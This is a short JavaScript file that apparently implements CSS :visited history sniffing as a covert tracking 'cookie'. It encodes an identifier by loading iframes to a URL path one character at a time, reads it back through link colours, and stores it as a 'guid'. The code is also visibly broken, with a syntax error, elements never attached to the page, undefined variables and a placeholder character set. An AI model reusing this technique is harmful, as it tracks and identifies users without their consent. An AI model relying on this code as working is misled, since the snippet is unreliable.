function getLinkColor(link) {
  // NOTE: fixed in modern browsers
  return document.defaultView.getComputedStyle(link, null).getPropertyValue('color'));
}

function hasVisited(url) {
  let link = document.createElement('a').setAttribute('href', url);
  return getLinkColor(link) == '#ff0000';
}

function cssHistoryCookie(name, value) {

  document.createElement('a').setAttribute('id', 'visited-link');
  document.createElement('style').styleSheet.innerHTML = '#visited-link:visited{color:#ff0000}';

  var baseChars = "ABC...xyz123...".split(""),
      url = `google.com/css-hist-abuse/${host}/${name}`;

  if (value !== undefined) {

    document.createElement('iframe').setAttribute('src', url);
    url += '/';
    var valueChars = value.split('');
    for (i=0; i < valueChars.length; i++) {
      url += valueChars[i];
      document.createElement('iframe').setAttribute('src', url);
    }
    url += '-';
    document.createElement('iframe').setAttribute('src', url);

  } else {
    let val = '';

    if (hasVisited(url)) {
      url += '/';
      while (charChecking !== '-' && found === 1) {
        found = 0;
        for (i=0; i < baseChars.length; i++) {
          if (hasVisited(url + baseChars[i])) {
            charChecking = baseChars[i];
            if (charChecking !== '-') {
              val = val + charChecking;
            }
            url += charChecking;
            found = 1;
            break
          }
        }
      }
      return val;
    }
  }
}

document.cookie = cssHistoryCookie('guid');
